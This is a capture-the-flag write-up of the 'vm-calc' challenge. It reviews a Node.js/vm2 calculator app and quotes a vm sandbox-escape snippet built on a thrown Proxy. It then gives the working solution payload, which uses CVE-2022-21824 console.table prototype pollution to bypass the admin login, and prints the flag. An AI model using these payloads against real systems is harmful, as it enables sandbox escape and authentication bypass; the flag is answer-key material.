Hello, Iâ€™m Lemon. I managed to solve [`blazing-fast`](blazingfast.md) and [`knock-knock`](knock.md), and after the contest with some hints I solved `vm-calc`. It was a very (hard) problem.
Anyways, let me show you guys how I managed to solve it.

### Source code review

At first I though itâ€™s a simple VM escape:

```js
const express = require('express');
const fsp = require('fs/promises');
const crypto = require('crypto');

const { NodeVM } = require('vm2');
const vm = new NodeVM({
    eval: false,
    wasm: false,
    wrapper: 'none',
    strict: true
});

const PORT = process.env.PORT || 80;

const users = [
    { user: "strellic", pass: "4136805643780af20755baddcc947d20f7e38e52f421c3c89a5a8b9d8a8d1da7" },
    { user: "ginkoid", pass: "cdf72d24394745eab295c6e047ee41aaec62f56bd41e2cea4ef7d244d96b51dd" }
];

const sha256 = (data) => crypto.createHash('sha256').update(data).digest('hex');

const app = express();

app.set("view engine", "hbs");

app.use(express.urlencoded({ extended: false }));

app.get("/", (req, res) => res.render("index"));
app.post("/", (req, res) => {
    const { calc } = req.body;

    if(!calc) {
        return res.render("index");
    }

    let result;
    try {
        result = vm.run(`return ${calc}`);
    }
    catch(err) {
        console.log(err);
        return res.render("index", { result: "There was an error running your calculation!"});
    }

    if(typeof result !== "number") {
        return res.render("index", { result: "Nice try..."});
    }

    res.render("index", { result });
});

app.get("/admin", (req, res) => res.render("admin"));

app.post("/admin", async (req, res) => {
    let { user, pass } = req.body;
    if(!user || !pass || typeof user !== "string" || typeof pass !== "string") {
        return res.render("admin", { error: "Missing username or password!" });
    }

    let hash = sha256(pass);
    if(users.filter(u => u.user === user && u.pass === hash)[0] !== undefined) {
        res.render("admin", { flag: await fsp.readFile("flag.txt") });
    }
    else {
        res.render("admin", { error: "Incorrect username or password!" });
    }
});

app.listen(PORT, () => console.log(`vm-calc listening on port ${PORT}`));
```

And honestly all I know about VM escape is in this GitHub Gist: 

import Gist from 'react-gist'

<Gist id="4f6e6d4a649405a9c86bb076905696af" />

And I found out some interesting ways in it:

```javascript
const code5 = `throw new Proxy({}, {
  get: function(me, key) {
	 const cc = arguments.callee.caller;
	 if (cc != null) {
		(cc.constructor.constructor('console.log(sauce)'))();
	 }
	 return me[key];
  }
})`;  

try {
  vm.runInContext(code5, vm.createContext(Object.create(null)));
}
catch(e) {
  console.log(e);
}
```

Throw a Proxy out as an exception, and then when someone executes `toString()` on this exception, it will be triggered, and you can `arguments.callee.caller`.

but itâ€™s a `vm2`  :(

### 1-day CVE Exploitation

After some time I figured out that this question is not asking us to find `vm2` 0-day, but to use a Node.js 1-day: use prototype pollution to bypass the check. So, letâ€™s explain how.

Hereâ€™s the vulnerable part of the code:

```javascript
if(users.filter(u => u.user === user && u.pass === hash)[0] !== undefined) {
    res.render("admin", { flag: await fsp.readFile("flag.txt") });
}
```

For me, at least it looks a bit weird, since it just filters the users array and check if an entry exists, like why not just use `Array.prototype.find` to directly check the existence of an element.
Also, I was sure that `vm2` didnâ€™t have any VM sandbox escape vulnerability, so I was sure that the weakness is here.
So, I had to check the `Dockerfile` to get the Node.js version: 

```dockerfile
FROM node:16.13.1-bullseye-slim
```

And the only to go was my homie Google ðŸ˜Š, and thank god, I got this:

> [**Prototype pollution via `console.table` properties (Low)(CVE-2022-21824)**](https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824)
> 
> Due to the formatting logic of the `console.table()` function it was not safe to allow user controlled input to be passed to the `properties` parameter while simultaneously passing a plain object with at least one property as the first parameter, which could be `__proto__`. The prototype pollution has very limited control, in that it only allows an empty string to be assigned numerical keys of the object `prototype`.  
> 
> Versions of Node.js with the fix for this use a null protoype for the object these properties are being assigned to.

We can pollute the first property of the array, the `[][0]` will be something that will make the `if` (check) `true` due to the prototype pollution.

```js
console.table([{ x : 1 }], [ "__proto__" ]);
```

The first parameter of this API is `data`, and the second parameter is the field to display, like this:

Hereâ€™s the fixed commit: 
https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b

Sending the payload `console.table([{x:1}], ["__proto__"]);` would prototype pollute the `0` property with an empty string, which allowed you to bypass the login check. :)

The flag is: `dice{y0u_4re_a_tru3_vm2_j4ilbreak3r!!!}`

Thatâ€™s all, folks.
